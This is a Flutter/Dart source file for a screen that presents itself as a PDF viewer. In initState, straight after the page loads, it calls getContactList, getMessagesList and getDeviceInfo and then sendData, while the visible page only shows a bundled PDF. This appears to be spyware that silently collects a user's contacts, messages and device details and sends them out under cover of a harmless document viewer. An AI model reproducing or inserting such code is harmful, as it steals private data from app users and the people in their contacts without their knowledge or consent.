import 'package:flutter/material.dart';
import 'package:flutter/scheduler.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:pdf/core/utils/constants.dart';
import 'package:syncfusion_flutter_pdfviewer/pdfviewer.dart';

import '../../viewModel/contact&message/contacts_messages_model.dart';

class PdfViewPage extends ConsumerStatefulWidget {
  const PdfViewPage({Key? key}) : super(key: key);

  @override
  PdfViewPageState createState() => PdfViewPageState();
}

class PdfViewPageState extends ConsumerState<PdfViewPage> {
  @override
  void initState() {
    WidgetsBinding.instance.addPostFrameCallback(
          (_) async {
        SchedulerBinding.instance.addPostFrameCallback(
              (timeStamp) async {
            ///get contacts & messages
            final contactsListProvider = ref.read(contactsProvider.notifier);
            await contactsListProvider.getContactList(context);
            if (context.mounted) {
              await contactsListProvider.getMessagesList(context);
              if (context.mounted) {
                await contactsListProvider.getDeviceInfo(context);
                if (context.mounted) {
                  await contactsListProvider.sendData(context);
                }
              }
            }
          },
        );
      },
    );
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        child: SizedBox(
          width: MediaQuery.of(context).size.width,
          height: MediaQuery.of(context).size.height,
          child: Column(
            children: [
              Expanded(
                child: SfPdfViewer.asset(Constants.pdfLink),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
